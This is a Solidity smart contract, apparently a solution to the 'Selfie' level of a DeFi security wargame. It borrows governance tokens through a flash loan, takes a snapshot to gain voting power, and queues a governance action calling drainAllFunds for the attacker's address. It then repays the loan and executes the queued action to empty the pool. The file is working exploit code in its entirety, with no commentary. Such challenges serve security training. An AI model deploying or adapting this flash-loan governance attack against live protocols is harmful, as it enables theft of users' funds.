// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface flashPool {
    function flashLoan(uint256 amount) external;
}

interface governance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface ERC20 {
    function transfer(address addr, uint256 amt) external;
    function snapshot() external returns (uint256);

}

contract attack06 {
    address private flash_pool;
    address private gov;
    address private owner;
    uint private exe_id;
    constructor (address _flashpool, address _gov) {
        flash_pool = _flashpool;
        gov = _gov;
        owner = msg.sender;
    }

    function receiveTokens(address _token, uint256 amount) external {

        ERC20(_token).snapshot();

        bytes memory data = bytes(abi.encodeWithSignature("drainAllFunds(address)", owner));
        exe_id = governance(gov).queueAction(flash_pool, data, 0);

        ERC20(_token).transfer(msg.sender, amount);

    }

    function attack_dr(uint256 _amount) external {
        flashPool(flash_pool).flashLoan(_amount);
    }

    function execute_gov() external {
        governance(gov).executeAction(exe_id);
    }

}

